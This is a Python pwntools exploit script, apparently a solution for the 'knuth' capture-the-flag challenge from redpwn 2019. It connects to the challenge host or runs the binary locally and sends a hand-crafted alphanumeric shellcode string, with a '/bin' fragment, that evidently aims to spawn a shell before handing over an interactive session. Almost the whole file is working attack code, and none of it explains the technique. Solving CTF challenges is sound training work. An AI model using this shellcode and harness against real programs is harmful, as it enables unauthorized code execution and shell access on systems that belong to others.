#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
# CUSTOM FUNCTIONS
def _snd(s):
  io.send(str(s))
def _sndl(s):
  io.sendline(str(s))
def _snda(a,s):
  io.sendafter(str(a),str(s))
def _sndla(a,s):
  io.sendlineafter(str(a),str(s))
def _rcvu(s):
  return io.recvuntil(str(s))
def _rcva():
  return io.recvall()
def _rcvn(n):
  return io.recv(n)
context.terminal = ['tmux', 'split', '-h']

exe = context.binary = ELF('knuth')

host = args.HOST or 'chall.2019.redpwn.net'
port = int(args.PORT or 4009)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x080486AE
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

# Put the start of the shellcode into esp and the rest should work
# Alphanumeric shellcode!!!
shellcode = "P\\LLLLXPY3E01E01u03u0fXh8eshXf5VJPZX4LPRfhbifhDefXf5AJfPDT[" + "X" * 1 + "_" * 50 + "5/bin" + "Hf5SNf5a1PP______QQQQXZ_^" + "@" * 0xb + "E" * 40
_snd(shellcode)

io.interactive()

